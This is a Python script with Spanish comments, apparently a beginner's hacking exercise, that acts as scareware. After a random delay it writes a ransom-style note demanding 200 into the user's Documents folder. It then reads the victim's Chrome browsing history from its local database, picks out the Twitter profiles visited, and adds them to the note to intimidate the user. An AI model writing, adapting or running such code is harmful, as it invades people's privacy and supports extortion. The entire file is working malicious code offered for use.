import os
import re
import sqlite3 # Conexion a una base de datos
from time import sleep
from random import randrange
from pathlib import Path # Libreria ruta home

HACKER_FILE_NAME = "PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    # Esperaremos entre 1 y 3 segundos
    n_seconds = randrange(1, 3)
    print("Durmiendo {} segundos.".format(n_seconds))
    sleep(n_seconds)
    # sleep(n_hours * n_minutes * 60)

def create_hacker_file(user_path):
    hacker_file = open(user_path + "/Documents/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola soy un hacker y he entrado en tu sistema, deposita 200 en esta cuenta, si no....\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial Inaccesible, reintentando en 5 segundos...")
            sleep(5)

# Usamos Regular Expresions (REGEX)
def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]: # (:) Hasta la entrada 10
        # Hacemos un filtrado en una ruta en común, filtramos las rutas en comun para solo encontrar cuentas en twitter
        # () Los parentesis se usan para capturar solo los valores requeridos
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que haz visitado los perfiles {} de twitter, wow....".format(", ".join(profiles_visited)))

def main():
    # Esperamos entre 1 y 3 horas
    delay_action()
    # Calculamos la ruta del usuario de Windows
    user_path = get_user_path()
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Recogemos su historial de google chrome, cuando sea posible...
    chrome_history = get_chrome_history(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)


# Distinguir cuentas en twitter / Pulir en el tiempo que pasa para que corra otra vez el programa
if __name__ == "__main__":
    main()